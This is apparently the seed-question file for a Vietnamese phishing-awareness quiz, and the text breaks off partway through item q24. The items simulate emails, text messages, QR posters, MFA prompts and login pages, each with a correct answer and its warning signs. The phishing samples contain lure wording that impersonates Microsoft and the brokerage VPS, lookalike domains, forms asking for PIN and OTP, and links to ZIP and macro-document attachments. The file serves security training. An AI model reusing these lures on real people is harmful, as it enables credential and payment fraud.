import type { QuizQuestion } from "./types";

export const seedQuestions: QuizQuestion[] = [
  {
    id: "q1",
    title: "Yêu cầu đổi mật khẩu khẩn cấp",
    category: "Email",
    scenarioIntro: "Bạn nhận được email tự xưng là từ bộ phận IT.",
    scenarioContent:
      "Hãy đọc nội dung email và quyết định xem đây có phải là một yêu cầu đáng tin cậy hay không.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Tên miền người gửi giả mạo"><strong>From:</strong> IT Support &lt;it-helpdesk@micr0soft-reset.com&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Password Expiring Today</div>
        <p>Dear employee, your password expires in <strong data-spot="danger" data-label="Ngôn ngữ tạo áp lực thời gian">2 hours</strong>.</p>
        <p>Please <a data-spot="danger" data-label="Link đăng nhập không phải Microsoft" href="https://micr0soft-reset.com/login" title="https://micr0soft-reset.com/login">click here to keep access</a> to your Microsoft 365 account.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Email dùng giọng điệu thúc ép, domain giả mạo và dẫn tới trang đăng nhập không thuộc Microsoft.",
    indicators: ["Giọng điệu khẩn cấp", "Tên miền giả mạo", "Liên kết đăng nhập đáng ngờ"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 1,
  },
  {
    id: "q2",
    title: "Xác nhận giao hàng thất bại",
    category: "SMS",
    scenarioIntro: "Bạn nhận được tin nhắn báo bưu kiện giao không thành công.",
    scenarioContent:
      "Hãy xem tin nhắn và tự đánh giá xem yêu cầu trong đó có nên được tin tưởng không.",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>Courier Notice</strong></p>
        <p data-spot="danger" data-label="Yêu cầu thanh toán phí bất thường">Delivery failed. Confirm your address and pay 2.99 USD:</p>
        <p><a data-spot="danger" data-label="Tên miền giao hàng giả mạo" href="https://courier-track-now.com/pay" title="https://courier-track-now.com/pay">courier-track-now.com/pay</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Đây là kiểu phishing phổ biến qua SMS: tạo cảm giác gấp, thu phí nhỏ và dẫn tới website lookalike để lấy thẻ.",
    indicators: ["Phí phát sinh bất thường", "Domain lạ", "Ép thao tác nhanh"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 2,
  },
  {
    id: "q3",
    title: "Cập nhật chính sách nghỉ phép",
    category: "Website",
    scenarioIntro: "Cổng thông tin nhân sự thông báo có chính sách nghỉ phép mới.",
    scenarioContent:
      "Hãy kiểm tra nội dung mô phỏng bên dưới và quyết định xem đây là phishing hay legitimate.",
    scenarioHtml: `
      <div class="portal-sim">
        <div class="mail-row" data-spot="safe" data-label="Đúng domain nội bộ VPS"><strong>Trang đích:</strong> <a href="https://hrm.vps.com.vn/policy/leave-2026" title="https://hrm.vps.com.vn/policy/leave-2026">https://hrm.vps.com.vn/policy/leave-2026</a></div>
        <p>Updated Leave Policy 2026</p>
        <button type="button">Acknowledge policy</button>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Ngữ cảnh phù hợp, domain đúng với hệ thống HR quen thuộc và không yêu cầu thông tin nhạy cảm.",
    indicators: ["Đúng bối cảnh", "Đúng domain nội bộ VPS", "Không yêu cầu nhập mật khẩu"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 3,
  },
  {
    id: "q4",
    title: "Hóa đơn quá hạn từ nhà cung cấp lạ",
    category: "Invoice",
    scenarioIntro: "Bạn nhận được hóa đơn quá hạn từ một nhà cung cấp không quen thuộc.",
    scenarioContent:
      "Hãy quan sát email và file đính kèm được đề cập, rồi tự đánh giá mức độ an toàn của tình huống này.",
    scenarioHtml: `
      <div class="invoice-sim">
        <div class="mail-row" data-spot="danger" data-label="Người gửi không thuộc nhà cung cấp quen thuộc"><strong>From:</strong> Billing Team &lt;billing@vendor-payment-alert.net&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Overdue invoice - immediate payment required</div>
        <p>We could not verify your last payment. Open the attached documents today to avoid service interruption.</p>
        <div class="attachment-list">
          <div class="attachment-card" data-spot="danger" data-label="File ZIP từ nguồn lạ có thể chứa mã độc">
            <span class="file-icon file-icon-danger">ZIP</span>
            <div>
              <strong>Invoice_Overdue_2026.zip</strong>
              <span>Compressed archive - 189 KB</span>
            </div>
            <a href="/assets/files/Invoice_Overdue_2026.zip" download>Download</a>
          </div>
          <div class="attachment-card" data-spot="danger" data-label="File Office macro .docm là định dạng rủi ro cao">
            <span class="file-icon file-icon-danger">DOCM</span>
            <div>
              <strong>Payment-Remittance.docm</strong>
              <span>Macro-enabled document - 54 KB</span>
            </div>
            <a href="/assets/files/Payment-Remittance.docm" download>Download</a>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "File nén từ nguồn không rõ ràng là dấu hiệu nguy hiểm, thường được dùng để phát tán malware hoặc tài liệu độc hại.",
    indicators: ["Nhà cung cấp không quen", "File ZIP đáng ngờ", "Dọa gián đoạn dịch vụ"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 4,
  },
  {
    id: "q5",
    title: "Cảnh báo bảo mật từ ngân hàng",
    category: "Email",
    scenarioIntro: "Một email cho biết tài khoản ngân hàng của bạn có hoạt động bất thường.",
    scenarioContent:
      "Hãy xem kỹ yêu cầu trong email trước khi quyết định đây là phishing hay legitimate.",
    scenarioHtml: `
      <div class="bank-sim">
        <div class="mail-row" data-spot="danger" data-label="Người gửi không thuộc ngân hàng thật"><strong>From:</strong> security@secure-banking-alert.com</div>
        <p>Restore access by entering your account number, PIN and one-time code below.</p>
        <form>
          <input data-spot="danger" data-label="Biểu mẫu lấy thông tin nhạy cảm" disabled value="Account Number" />
          <input data-spot="danger" data-label="Ngân hàng không bao giờ hỏi PIN đủ" disabled value="PIN" />
          <input data-spot="danger" data-label="OTP không được nhập vào form email" disabled value="OTP" />
        </form>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Ngân hàng không yêu cầu nhập đầy đủ PIN hay OTP qua email. Đây là hành vi thu thập thông tin xác thực.",
    indicators: ["Yêu cầu dữ liệu nhạy cảm", "Biểu mẫu thu thập thông tin", "Tạo tâm lý lo sợ"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 5,
  },
  {
    id: "q6",
    title: "Yêu cầu xác thực MFA bất ngờ",
    category: "Account Alert",
    scenarioIntro: "Ứng dụng xác thực trên điện thoại liên tục hiện yêu cầu phê duyệt đăng nhập.",
    scenarioContent:
      "Dựa trên bối cảnh mô tả, hãy xác định đây là tín hiệu an toàn hay đáng ngờ.",
    scenarioHtml: `
      <div class="mfa-sim mfa-verify-sim">
        <div class="mfa-phone-shell">
          <div class="mfa-phone-status"><span>09:42</span><span>5G 84%</span></div>
          <div class="mfa-verify-popup">
            <div class="mfa-popup-icon">!</div>
            <p class="mfa-app-name">Microsoft Authenticator</p>
            <h4 data-spot="danger" data-label="Yêu cầu phê duyệt đăng nhập xuất hiện bất ngờ, người dùng không chủ động đăng nhập">Approve sign-in?</h4>
            <div class="mfa-request-card">
              <div data-spot="danger" data-label="Vị trí đăng nhập không rõ ràng và không khớp bối cảnh làm việc"><span>Location</span><strong>Bangkok, Thailand</strong></div>
              <div data-spot="danger" data-label="Thiết bị đăng nhập lạ là dấu hiệu cần từ chối yêu cầu MFA"><span>Device</span><strong>Unknown Windows device</strong></div>
              <div data-spot="danger" data-label="Nhiều yêu cầu liên tiếp là dấu hiệu MFA fatigue"><span>Requests</span><strong>5 prompts in 2 minutes</strong></div>
            </div>
            <div class="mfa-number-match" data-spot="danger" data-label="Nếu không chủ động đăng nhập, không được nhập mã hoặc bấm Approve dù popup trông hợp lệ">
              <span>Enter number shown on sign-in screen</span>
              <strong>42</strong>
            </div>
            <div class="mfa-actions">
              <button type="button" class="mfa-deny">Deny</button>
              <button type="button" class="mfa-approve" data-spot="danger" data-label="Bấm Approve có thể cấp quyền truy cập cho kẻ tấn công">Approve</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Đây có thể là MFA fatigue: kẻ tấn công đã có mật khẩu và đang spam thông báo để bạn bấm nhầm chấp nhận.",
    indicators: ["Yêu cầu bất ngờ", "Lặp lại nhiều lần", "Thời điểm bất thường"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 6,
  },
  {
    id: "q7",
    title: "Lời mời họp nội bộ hằng tuần",
    category: "Email",
    scenarioIntro: "Bạn nhận được lịch họp từ quản lý trực tiếp.",
    scenarioContent:
      "Hãy xem lời mời họp và quyết định xem tình huống này là phishing hay legitimate.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi nội bộ quen thuộc thuộc domain VPS"><strong>From:</strong> manager@vps.com.vn</div>
        <div class="mail-row" data-spot="safe" data-label="Link họp nội bộ đúng hệ thống VPS"><strong>Meeting link:</strong> <a href="https://meet.vps.com.vn/team-weekly" title="https://meet.vps.com.vn/team-weekly">meet.vps.com.vn/team-weekly</a></div>
        <p>Weekly Operations Sync - Tuesday 10:00 AM</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Người gửi, nhịp họp và nền tảng họp đều trùng với hành vi nội bộ bình thường nên đây là trường hợp hợp lệ.",
    indicators: ["Người gửi quen thuộc", "Đúng lịch họp", "Link đúng hệ thống VPS"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 7,
  },
  {
    id: "q8",
    title: "Mã QR truy cập bảng lương",
    category: "QR",
    scenarioIntro: "Một tờ poster đặt gần máy in yêu cầu nhân viên quét QR để xem cập nhật bảng lương.",
    scenarioContent:
      "Hãy quan sát thông tin hiển thị quanh mã QR và tự đánh giá mức độ đáng tin của yêu cầu này.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="fake-qr">QR</div>
        <p>Scan to review payroll adjustments</p>
        <p data-spot="danger" data-label="Đích đến không thuộc domain VPS">Destination: <a href="https://payroll-vps-secure.net/login" title="https://payroll-vps-secure.net/login">payroll-vps-secure.net/login</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "QR phishing che giấu đích đến thực sự cho tới khi người dùng quét. Domain đăng nhập không thuộc tổ chức là dấu hiệu đỏ rõ ràng.",
    indicators: ["Đích QR không rõ", "Yêu cầu đăng nhập", "Domain ngoài VPS"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 8,
  },
  {
    id: "q9",
    title: "Tài liệu hợp đồng từ bộ phận pháp chế",
    category: "Website",
    scenarioIntro: "Phòng pháp chế gửi yêu cầu đọc một hợp đồng trên nền tảng tài liệu đã được phê duyệt.",
    scenarioContent:
      "Hãy xem thông tin trong mô phỏng và quyết định đây là phishing hay legitimate.",
    scenarioHtml: `
      <div class="portal-sim">
        <div class="mail-row" data-spot="safe" data-label="Nền tảng tài liệu VPS đã phê duyệt"><strong>Opened via:</strong> <a href="https://docs.vps.com.vn/legal/contract-2026" title="https://docs.vps.com.vn/legal/contract-2026">docs.vps.com.vn/legal/contract-2026</a></div>
        <p>Contract Review Required</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Quy trình, hệ thống và thương hiệu đều nhất quán với môi trường làm việc bình thường nên đây là trường hợp hợp lệ.",
    indicators: ["Đúng quy trình", "Đúng nền tảng", "Không có yêu cầu bất thường"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 9,
  },
  {
    id: "q10",
    title: "Yêu cầu chuyển khoản từ CEO",
    category: "Email",
    scenarioIntro: "Bạn nhận được một email ngắn có vẻ như đến từ CEO.",
    scenarioContent:
      "Hãy xem kỹ yêu cầu trong email trước khi quyết định mức độ an toàn của tình huống này.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Domain giả dạng lãnh đạo VPS"><strong>From:</strong> ceo@vps-executive.com</div>
        <p data-spot="danger" data-label="Yêu cầu chuyển khoản gấp">I need you to process an urgent confidential wire transfer in the next 15 minutes.</p>
        <p data-spot="danger" data-label="Ép giữ bí mật, né quy trình">Do not inform finance until it is done.</p>
        <p><a href="/assets/files/WireTransferForm.html" target="_blank" rel="noreferrer">Open transfer form</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Đây là kiểu lừa đảo BEC điển hình: lợi dụng quyền lực, yêu cầu gấp, giữ bí mật và né quy trình phê duyệt bình thường.",
    indicators: ["Gây áp lực từ cấp cao", "Yêu cầu giữ bí mật", "Đề nghị thanh toán bất thường"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 10,
  },
  {
    id: "q11",
    title: "Ảnh chụp website đăng nhập giả mạo",
    category: "Website",
    scenarioIntro: "Bạn được gửi ảnh chụp màn hình của một trang đăng nhập để kiểm tra độ an toàn.",
    scenarioContent:
      "Quan sát ảnh chụp màn hình và tự đánh giá xem trang này có đáng tin hay không.",
    scenarioHtml: `
      <div class="image-sim">
        <img data-spot="danger" data-label="Thanh địa chỉ hiển thị domain giả"
          alt="Fake login screenshot"
          src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='800' height='420'><rect width='100%' height='100%' fill='%230f172a'/><rect x='40' y='50' width='720' height='40' rx='12' fill='%23dbeafe'/><text x='60' y='76' font-size='20' fill='%23111827'>https://micros0ft-verify-login.com</text><rect x='220' y='120' width='360' height='220' rx='22' fill='white'/><text x='320' y='165' font-size='28' fill='%23111827'>Microsoft 365</text><rect x='260' y='195' width='280' height='38' rx='10' fill='%23e5e7eb'/><rect x='260' y='245' width='280' height='38' rx='10' fill='%23e5e7eb'/><rect x='260' y='298' width='280' height='34' rx='12' fill='%232563eb'/><text x='375' y='321' font-size='18' fill='white'>Sign in</text></svg>"
        />
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Ảnh cho thấy website dùng domain giả mạo có ký tự số thay cho chữ cái. Dù giao diện giống Microsoft, URL không hợp lệ.",
    indicators: ["Domain lookalike", "Bắt chước thương hiệu", "Trang đăng nhập nhái"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 11,
  },
  {
    id: "q12",
    title: "SMS gia hạn gói dữ liệu di động",
    category: "SMS",
    scenarioIntro: "Bạn nhận được tin nhắn thông báo gói cước sắp hết hạn.",
    scenarioContent:
      "Hãy đọc tin nhắn và quyết định xem đây là phishing hay legitimate.",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>Mobile Rewards</strong></p>
        <p data-spot="danger" data-label="Mồi nhử quà tặng miễn phí">Your data plan ends today. Claim free 20GB now:</p>
        <p><a data-spot="danger" data-label="Link không thuộc nhà mạng" href="https://viettel-bonus-gb.top/claim" title="https://viettel-bonus-gb.top/claim">viettel-bonus-gb.top/claim</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Ưu đãi bất thường đi kèm giới hạn thời gian ngắn và domain không phải nhà mạng chính thức là dấu hiệu phishing.",
    indicators: ["Khuyến mãi quá tốt", "Giới hạn thời gian", "Domain không chính thức"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 12,
  },
  {
    id: "q13",
    title: "Tin nhắn OTP từ dịch vụ quen thuộc",
    category: "SMS",
    scenarioIntro: "Bạn vừa thực hiện đăng nhập vào ứng dụng ngân hàng trên điện thoại.",
    scenarioContent:
      "Ngay sau đó bạn nhận được một tin nhắn OTP. Hãy tự đánh giá xem tin nhắn này có đáng tin hay không.",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>VCB</strong></p>
        <p data-spot="safe" data-label="Tin nhắn OTP chuẩn, không có link">OTP dang nhap cua quy khach la 184922. Khong chia se ma nay cho bat ky ai.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Tin nhắn đến đúng thời điểm bạn đang đăng nhập, không chứa link, không yêu cầu bấm vào đâu và nội dung phù hợp với OTP thông thường.",
    indicators: ["Đúng thời điểm", "Không có link", "Nội dung OTP chuẩn"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 13,
  },
  {
    id: "q14",
    title: "Hình ảnh QR dán ở khu pantry",
    category: "QR",
    scenarioIntro: "Một mã QR được dán trên poster nội bộ với nội dung nhận quà nhân viên.",
    scenarioContent:
      "Bạn chỉ có ảnh chụp poster. Hãy quan sát kỹ và quyết định xem tình huống này có an toàn không.",
    scenarioHtml: `
      <div class="image-sim">
        <img data-spot="danger" data-label="Poster dẫn tới domain lạ"
          alt="Poster QR phishing"
          src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='760' height='420'><rect width='100%' height='100%' fill='%230b1727'/><rect x='70' y='40' width='620' height='340' rx='28' fill='%23ffffff'/><text x='240' y='100' font-size='30' fill='%23111827'>Employee Gift Claim</text><rect x='130' y='135' width='180' height='180' fill='%23111827'/><path d='M140 145h50v50h-50zM250 145h50v50h-50zM140 255h50v50h-50z' fill='%23ffffff'/><text x='350' y='190' font-size='22' fill='%23111827'>Scan to verify staff ID</text><text x='350' y='235' font-size='18' fill='%23b91c1c'>reward-hr-bonus.xyz/login</text></svg>"
        />
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Poster có thể trông chuyên nghiệp nhưng đường dẫn đích là domain ngoài, không thuộc hệ thống nhân sự hay intranet công ty.",
    indicators: ["Domain lạ", "Mã QR che giấu đích đến", "Dụ người dùng đăng nhập"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 14,
  },
  {
    id: "q15",
    title: "Email VPS yêu cầu cập nhật eKYC",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo cần cập nhật eKYC cho tài khoản chứng khoán VPS.",
    scenarioContent:
      "Hãy kiểm tra người gửi, nội dung yêu cầu và liên kết trong email trước khi đưa ra quyết định.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi hiển thị đúng domain @vps.com.vn"><strong>From:</strong> VPS Support &lt;support@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Cập nhật eKYC trước 17:00 hôm nay</div>
        <p data-spot="danger" data-label="Nội dung thúc giục thao tác gấp">Tài khoản của Quý khách sẽ bị tạm khóa nếu không cập nhật eKYC trong ngày.</p>
        <p>Vui lòng truy cập: <a data-spot="danger" data-label="Link không thuộc domain chính thức vps.com.vn" href="https://vps-ekyc-secure.com.vn/login" title="https://vps-ekyc-secure.com.vn/login">vps-ekyc-secure.com.vn/login</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Email có thể hiển thị đúng người gửi @vps.com.vn, nhưng vẫn có khả năng email bị lạm dụng, bị chiếm quyền hoặc bị giả mạo phần hiển thị. Trong tình huống này, liên kết dẫn tới domain ngoài không phải vps.com.vn nên đây là dấu hiệu phishing rõ ràng.",
    indicators: ["Sender có vẻ hợp lệ nhưng có thể bị lạm dụng", "Link ngoài domain", "Thúc giục cập nhật gấp"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 15,
  },
  {
    id: "q16",
    title: "SMS VPS thông báo khóa tài khoản",
    category: "SMS",
    scenarioIntro: "Bạn nhận được SMS thông báo tài khoản chứng khoán VPS sắp bị khóa.",
    scenarioContent:
      "Hãy đánh giá nội dung SMS và đường dẫn kèm theo trước khi quyết định.",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>VPS-Notify</strong></p>
        <p data-spot="danger" data-label="Thông điệp tạo áp lực về việc khóa tài khoản">Tài khoản VPS của Quý khách sẽ bị khóa sau 30 phút do chưa xác minh thông tin.</p>
        <p><a data-spot="danger" data-label="Domain giả mạo gần giống VPS" href="https://vps-com-vn.verify-account.net" title="https://vps-com-vn.verify-account.net">vps-com-vn.verify-account.net</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "SMS dùng áp lực thời gian và domain dài, lạ, chèn chuỗi vps-com-vn để tạo cảm giác giống trang thật.",
    indicators: ["Thúc giục trong 30 phút", "Domain giả mạo", "Yêu cầu xác minh qua link SMS"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 16,
  },
  {
    id: "q17",
    title: "Thông báo VPS từ domain lookalike",
    category: "Email",
    scenarioIntro: "Một email thông báo xác nhận lệnh rút tiền được gửi tới hộp thư của bạn.",
    scenarioContent:
      "Hãy kiểm tra kỹ tên miền người gửi và nội dung hành động được yêu cầu.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Domain người gửi dùng ký tự gần giống, không phải vps.com.vn"><strong>From:</strong> VPS Transaction &lt;no-reply@vps.com-vn.co&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Lệnh rút tiền đang chờ xác nhận</div>
        <p data-spot="danger" data-label="Yêu cầu hủy lệnh nếu không nhận diện được giao dịch">Nếu không phải Quý khách thực hiện, bấm hủy lệnh ngay lập tức.</p>
        <p><a data-spot="danger" data-label="Link dẫn tới domain ngoài hệ thống VPS" href="https://cancel-vps-order.com/secure" title="https://cancel-vps-order.com/secure">Hủy lệnh rút tiền</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Domain người gửi và link đều không phải vps.com.vn. Nội dung đánh vào tâm lý sợ mất tiền để thúc đẩy người dùng bấm link.",
    indicators: ["Domain lookalike", "Tâm lý sợ mất tiền", "Link hủy lệnh giả mạo"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 17,
  },
  {
    id: "q18",
    title: "Thông báo bảo trì từ VPS",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo lịch bảo trì hệ thống từ VPS.",
    scenarioContent:
      "Hãy xem email có yêu cầu đăng nhập hoặc cung cấp thông tin nhạy cảm hay không.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi đúng domain chính thức"><strong>From:</strong> VPS Customer Service &lt;cskh@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Thông báo lịch bảo trì hệ thống</div>
        <p data-spot="safe" data-label="Nội dung chỉ thông báo, không yêu cầu đăng nhập">Hệ thống giao dịch trực tuyến sẽ bảo trì từ 23:00 đến 23:30 ngày hôm nay.</p>
        <p data-spot="safe" data-label="Link đúng domain chính thức vps.com.vn">Chi tiết tại: <a href="https://www.vps.com.vn/thong-bao" title="https://www.vps.com.vn/thong-bao">www.vps.com.vn/thong-bao</a></p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Email đến từ domain chính thức, chỉ thông báo lịch bảo trì và không yêu cầu nhập mật khẩu, OTP hay thông tin nhạy cảm.",
    indicators: ["Domain chính thức", "Không yêu cầu đăng nhập", "Không tạo áp lực thao tác"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 18,
  },
  {
    id: "q19",
    title: "SMS nhận thưởng cổ phiếu VPS",
    category: "SMS",
    scenarioIntro: "Bạn nhận được SMS nói rằng mình được nhận thưởng cổ phiếu miễn phí.",
    scenarioContent:
      "Hãy đánh giá lời mời nhận thưởng và đường dẫn trong SMS.",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>VPS Bonus</strong></p>
        <p data-spot="danger" data-label="Mồi nhử quà tặng quá hấp dẫn">Chúc mừng! Quý khách được nhận gói thưởng cổ phiếu trị giá 2.000.000 VND.</p>
        <p data-spot="danger" data-label="Thúc giục nhận thưởng trong thời gian ngắn">Nhận trước 18:00 hôm nay để không mất quyền lợi.</p>
        <p><a data-spot="danger" data-label="Domain không phải VPS chính thức" href="https://vps-stock-gift.top/claim" title="https://vps-stock-gift.top/claim">vps-stock-gift.top/claim</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Đây là kịch bản phishing qua SMS: dùng quà tặng, thời hạn ngắn và domain lạ để dẫn người dùng tới trang giả mạo.",
    indicators: ["Quà tặng bất thường", "Thời hạn ngắn", "Domain .top đáng ngờ"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 19,
  },
  {
    id: "q20",
    title: "Cảnh báo đăng nhập VPS từ thiết bị mới",
    category: "Account Alert",
    scenarioIntro: "Bạn nhận được cảnh báo có đăng nhập VPS từ thiết bị mới.",
    scenarioContent:
      "Hãy kiểm tra cách email yêu cầu bạn xử lý cảnh báo này.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi đúng domain @vps.com.vn"><strong>From:</strong> VPS Security &lt;security@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Cảnh báo đăng nhập từ thiết bị mới</div>
        <p>Hệ thống ghi nhận đăng nhập từ thiết bị mới vào lúc 09:42.</p>
        <p>Nếu không phải Quý khách, vui lòng xác minh tại <a data-spot="danger" data-label="Text hiển thị là vps.com.vn nhưng hyperlink thật trỏ tới website giả mạo vps-security-check.vn" href="https://vps-security-check.vn/login" title="https://vps-security-check.vn/login">https://www.vps.com.vn/bao-mat/dang-nhap</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Người gửi có thể hiển thị đúng @vps.com.vn, nhưng email vẫn có thể bị lạm dụng, bị chiếm quyền hoặc bị giả mạo phần hiển thị. Link xác minh không thuộc vps.com.vn nên không nên đăng nhập qua liên kết trong email.",
    indicators: ["Sender hợp lệ nhưng có thể bị lạm dụng", "Cảnh báo bảo mật tạo lo lắng", "Text link và hyperlink thật không khớp"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 20,
  },
  {
    id: "q21",
    title: "Website VPS sai tên miền đăng nhập",
    category: "Website",
    scenarioIntro: "Bạn mở một trang đăng nhập được chia sẻ trong nhóm chat đầu tư.",
    scenarioContent:
      "Hãy quan sát tên miền và quyết định trang này có đáng tin không.",
    scenarioHtml: `
      <div class="portal-sim">
        <div class="mail-row" data-spot="danger" data-label="Tên miền có thêm dấu gạch và không phải vps.com.vn"><strong>URL:</strong> <a href="https://vps-trading.com.vn/login" title="https://vps-trading.com.vn/login">https://vps-trading.com.vn/login</a></div>
        <p>Đăng nhập tài khoản VPS SmartOne</p>
        <form>
          <input data-spot="danger" data-label="Biểu mẫu đăng nhập trên domain không hợp lệ" disabled value="Số tài khoản / Email" />
          <input data-spot="danger" data-label="Không nhập mật khẩu trên trang không đúng domain" disabled value="Mật khẩu" />
        </form>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Trang bắt chước giao diện đăng nhập VPS nhưng domain không phải vps.com.vn. Đăng nhập tại đây có thể làm lộ thông tin tài khoản.",
    indicators: ["Domain không hợp lệ", "Biểu mẫu đăng nhập giả", "Nguồn link từ nhóm chat"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 21,
  },
  {
    id: "q22",
    title: "Email VPS nhắc lịch sự kiện đầu tư",
    category: "Email",
    scenarioIntro: "Bạn nhận được email nhắc lịch hội thảo đầu tư từ VPS.",
    scenarioContent:
      "Hãy đánh giá xem email này có dấu hiệu bất thường hay không.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi đúng domain VPS"><strong>From:</strong> events@vps.com.vn</div>
        <div class="mail-row"><strong>Subject:</strong> Nhắc lịch webinar chiến lược đầu tư</div>
        <p data-spot="safe" data-label="Nội dung phù hợp với email sự kiện, không yêu cầu thông tin nhạy cảm">Webinar sẽ diễn ra lúc 19:30. Quý khách có thể xem thông tin chương trình trên website VPS.</p>
        <p data-spot="safe" data-label="Link đúng domain chính thức">Link chương trình: <a href="https://www.vps.com.vn/su-kien" title="https://www.vps.com.vn/su-kien">www.vps.com.vn/su-kien</a></p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Email đúng domain, nội dung chỉ nhắc lịch sự kiện và link trỏ về website chính thức. Không có yêu cầu mật khẩu hay OTP.",
    indicators: ["Đúng domain", "Không yêu cầu đăng nhập", "Đúng bối cảnh sự kiện"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 22,
  },
  {
    id: "q23",
    title: "Thông báo tăng hạn mức giao dịch VPS",
    category: "Email",
    scenarioIntro: "Một email thông báo bạn được tăng hạn mức giao dịch trong ngày.",
    scenarioContent:
      "Hãy kiểm tra điều kiện nhận hạn mức và đường dẫn xác nhận.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Người gửi không đúng domain chính thức"><strong>From:</strong> VPS Margin &lt;margin@vps-vn.net&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Tăng hạn mức margin trong 2 giờ</div>
        <p data-spot="danger" data-label="Lời hứa quyền lợi tài chính kết hợp thời hạn ngắn">Quý khách được tăng hạn mức margin 500 triệu VND nếu xác nhận trong 2 giờ.</p>
        <p><a data-spot="danger" data-label="Link xác nhận trên domain lạ" href="https://margin-vps-fast.net/approve" title="https://margin-vps-fast.net/approve">Xác nhận hạn mức</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Email đánh vào lợi ích tài chính và thời hạn ngắn. Domain người gửi và link đều không phải VPS chính thức.",
    indicators: ["Lời hứa tài chính", "Thời hạn gấp", "Domain người gửi và link đáng ngờ"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 23,
  },
  {
    id: "q24",
    title: "SMS xác nhận OTP giao dịch VPS",
    category: "SMS",
    scenarioIntro: "Bạn nhận được SMS yêu cầu xác nhận OTP cho một giao dịch chứng khoán.",
    scenarioContent:
      "Hãy xem SMS có đang cố lấy mã OTP hoặc dẫn bạn sang trang lạ hay không.",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>VPS-OTP</strong></p>
        <p data-spot="danger" data-label="SMS yêu cầu nhập OTP vào link lạ">Phát hiện lệnh đặt mua bất thường. Nhập OTP tại link sau để hủy lệnh.</p>
        <p><a data-spot="danger" data-label="Website thu thập OTP giả mạo VPS" href="https://otp-vps-confirm.com.vn" title="https://otp-vps-confirm.com.vn">otp-vps-confirm.com.vn</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
